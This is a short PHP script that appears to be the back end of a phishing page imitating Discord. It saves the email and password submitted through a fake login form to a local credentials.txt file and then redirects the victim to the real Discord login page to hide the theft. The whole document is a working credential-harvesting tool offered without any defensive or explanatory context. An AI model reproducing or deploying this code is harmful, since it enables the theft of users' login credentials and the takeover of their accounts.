<?php 
file_put_contents("credentials.txt", "[+] Discord -> Usuario: " . $_POST['email'] . " Contraseña: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://discord.com/login');
exit();
?>
